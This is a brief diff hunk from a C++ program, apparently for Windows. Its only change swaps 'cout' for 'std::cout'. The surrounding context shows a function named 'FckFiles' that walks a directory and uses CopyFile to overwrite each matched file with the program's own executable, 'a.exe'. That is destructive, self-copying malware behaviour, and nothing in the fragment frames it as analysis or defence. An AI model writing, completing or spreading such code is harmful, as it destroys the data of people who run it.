@@ -18,7 +18,7 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 
   hFind = FindFirstFile(filter.c_str(), &FindFileData);
   Chain = Chain + sWords[rand() % 4];
-  cout << Chain;
+  std::cout << Chain;
   CopyFile("./a.exe",entry.path().string().c_str(),0);
   if (hFind == INVALID_HANDLE_VALUE)
   {
